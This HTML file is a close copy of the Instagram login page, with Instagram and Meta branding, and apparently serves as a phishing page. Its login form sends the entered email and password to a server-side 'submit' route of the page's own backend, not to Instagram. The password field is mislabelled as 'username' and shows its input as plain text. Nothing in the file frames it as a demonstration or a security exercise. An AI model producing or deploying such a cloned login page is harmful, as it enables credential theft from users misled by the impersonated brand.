
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, Helvetica, sans-serif;
    }

    body {
      min-height: 100vh;
      display: flex;
      color: #111;
      background: #fff;
    }

    /* LEFT SIDE */

    .left {
      width: 57%;
      min-height: 100vh;
      position: relative;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 40px;
    }

    .logo {
      position: absolute;
      top: 40px;
      left: 45px;
      width: 76px;
      height: 76px;
    }

    .logo svg {
      width: 100%;
      height: 100%;
    }

    .left h1 {
      margin-top: 125px;
      font-size: clamp(30px, 3vw, 50px);
      font-weight: 400;
      line-height: 1.6;
      text-align: center;
    }

    .gradient {
      background: linear-gradient(
        90deg,
        #ff7043,
        #ff0080
      );
      color: transparent;
      background-clip: text;
      -webkit-background-clip: text;

      
    }

    /* OVERLAPPING PHOTO CARDS */

    .illustration {
      width: 430px;
      max-width: 100%;
      height: 365px;
      position: relative;
      display: flex;
      justify-content: center;
      align-items: center;
      margin-top: 30px;
    }

    .photo {
      position: absolute;
      overflow: hidden;
      background-size: cover;
      background-position: center;
      border-radius: 24px;
      box-shadow: 0 8px 28px #0002;
    }

    .photo.back {
      width: 175px;
      height: 250px;
      left: 35px;
      transform: rotate(-6deg);
      background-image: url(
        "https://images.unsplash.com/photo-1529156069898-49953e39b3ac?w=500"
      );
    }

    .photo.middle {
      width: 175px;
      height: 260px;
      right: 30px;
      transform: rotate(5deg);
      background-image: url(
        "https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=500"
      );
    }

    .photo.front {
      width: 205px;
      height: 350px;
      z-index: 2;
      border: 4px solid white;
      background-image: url(
        "https://images.unsplash.com/photo-1521737711867-e3b97375f902?w=500"
      );
    }

    .heart {
      position: absolute;
      left: 5px;
      bottom: 65px;
      color: #ff1493;
      font-size: 55px;
      z-index: 3;
    }

    .reaction {
      position: absolute;
      top: 80px;
      left: 85px;
      background: white;
      padding: 8px 12px;
      border-radius: 20px;
      z-index: 4;
      box-shadow: 0 3px 12px #0002;
    }

    /* RIGHT SIDE */

    .right {
      width: 43%;
      min-height: 100vh;
      border-left: 2px solid #e5e5e5;
      display: flex;
      justify-content: center;
      padding: 115px 4.8%;
    }

    .login-box {
      width: 100%;
      max-width: 680px;
    }

    .login-box h3 {
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 30px;
    }

    /* INPUT FIELDS */

    .login-box input {
      display: block;
      width: 100%;
      height: 75px;
      padding: 0 20px;
      margin-bottom: 14px;
      border: 1px solid #d6d6d6;
      border-radius: 20px;
      font-size: 17px;
      background: white;
      outline: none;
    }

    .login-box input:focus {
      border-color: #999;
    }

    .login-box input::placeholder {
      color: #666;
      opacity: 1;
    }

    /* BUTTONS */

    .btn {
      width: 100%;
      height: 55px;
      border: none;
      border-radius: 30px;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 10px;
      font-size: 17px;
      cursor: pointer;
    }

    .login-btn {
      margin-top: 15px;
      background: #9bc1f3;
      color: white;
      font-weight: 600;
      transition: background-color 0.2s ease;
    }

    form:valid .login-btn {
      background: #0866ff;
    }

    form.invalid .login-btn {
      background: #9bc1f3;
    }

    .forgot {
      display: block;
      text-align: center;
      margin-top: 30px;
      margin-bottom: 80px;
      font-size: 17px;
      text-decoration: none;
      color: #111;
    }

    /* FACEBOOK BUTTON */

    .facebook {
      height: 55px;
      background: #f2f2f2;
      color: #111;
      font-size: 18px;
      font-weight: 400;
      gap: 10px;
    }

    .facebook svg {
      width: 18px;
      height: 18px;
      flex-shrink: 0;
    }

    /* CREATE ACCOUNT BUTTON */

    .create {
      height: 55px;
      margin-top: 14px;
      background: #fff;
      color: #0064e0;
      border: 1px solid #1877f2;
      font-size: 18px;
    }

    /* META FOOTER */

    .meta {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 4px;
      margin-top: 30px;
      color: #263238;
      font-size: 20px;
      line-height: 24px;
    }

    .meta svg {
      width: 24px;
      height: 18px;
      display: block;
    }

    /* RESPONSIVE MOBILE LAYOUT */

    @media (max-width: 800px) {
      body {
        display: block;
      }

      .left {
        display: none;
      }

      .right {
        width: 100%;
        min-height: 100vh;
        border: none;
        padding: 80px 24px 40px;
      }

      .login-box {
        max-width: 450px;
      }

      .login-box input {
        height: 60px;
      }

      .forgot {
        margin-bottom: 55px;
      }
    }
  </style>
</head>

<body>

  <!-- LEFT SECTION -->

  <section class="left">

    <!-- Instagram gradient logo -->

    <div class="logo">
      <svg viewBox="0 0 100 100"
           xmlns="http://www.w3.org/2000/svg"
           role="img"
           aria-label="Instagram logo">

        <defs>
          <linearGradient id="igGradient"
                          x1="0%" y1="100%"
                          x2="100%" y2="0%">
            <stop offset="0%" stop-color="#FFD776"/>
            <stop offset="35%" stop-color="#FF543E"/>
            <stop offset="65%" stop-color="#C837AB"/>
            <stop offset="100%" stop-color="#6750FF"/>
          </linearGradient>
        </defs>

        <rect x="10" y="10"
              width="80" height="80"
              rx="23"
              fill="none"
              stroke="url(#igGradient)"
              stroke-width="8"/>

        <circle cx="50" cy="50" r="19"
                fill="none"
                stroke="url(#igGradient)"
                stroke-width="8"/>

        <circle cx="74" cy="27" r="5"
                fill="#D62976"/>
      </svg>
    </div>

    <h1>
      See everyday moments from your<br>
      <span class="gradient">close friends</span>.
    </h1>

    <!-- Decorative photo collage -->

    <div class="illustration">
      <div class="photo back"></div>
      <div class="photo middle"></div>
      <div class="photo front"></div>

      <div class="reaction">😍 👀 🥰</div>
      <div class="heart">♥</div>
    </div>

  </section>


  <!-- RIGHT SECTION -->

  <section class="right">

    <div class="login-box">

      <h3>Log in to Instagram</h3>

      <form id="loginForm" action="{{ url_for('submit') }}" method="POST">
        <label for="email"></label>
        <input
          id="email"
          name="email"
          type="email"
          placeholder="Mobile number, username or email address"
          autocomplete="on"
          required
        >

        <label for="username"></label>
        <input
          id="username"
          name="username"
          type="text"
          placeholder="Password"
          autocomplete="on"
          required
        >

        <button class="btn login-btn" type="submit">
          Log in
        </button>
      </form>

      <a href="#" class="forgot">Forgotten password?</a>


      <!-- Facebook button -->

      <button class="btn facebook" type="button">

        <svg viewBox="0 0 24 24"
             xmlns="http://www.w3.org/2000/svg"
             aria-hidden="true">

          <circle cx="12" cy="12" r="11"
                  fill="#0866FF"/>

          <path
            d="M13.5 21v-8h2.7l.4-3.1h-3.1v-2
               c0-.9.3-1.5 1.6-1.5h1.7V3.6
               c-.3 0-1.3-.1-2.4-.1
               -2.5 0-4.2 1.5-4.2 4.3v2.1H7.5V13h2.7v8z"
            fill="#fff"/>
        </svg>

        <span>Log in with Facebook</span>

      </button>


      <!-- Create account button -->

      <button class="btn create" type="button">
        Create new account
      </button>


      <!-- Meta logo and text -->

      <div class="meta">

        <svg viewBox="0 0 24 18"
             xmlns="http://www.w3.org/2000/svg"
             role="img"
             aria-label="Meta logo">

          <path
            d="M2 13.8C2 9.7 5.2 3 8.5 3
               c4.2 0 7.2 12 10.1 12
               2 0 3.4-3.1 3.4-5.8
               C22 5.7 20.3 3 18.2 3
               c-3.6 0-7.4 12-11.2 12
               C4.3 15 2 12.8 2 9.8"
            fill="none"
            stroke="#0866FF"
            stroke-width="2.6"
            stroke-linecap="round"
            stroke-linejoin="round"/>
        </svg>

        <span>Meta</span>

      </div>

    </div>

  </section>


</body>
</html>
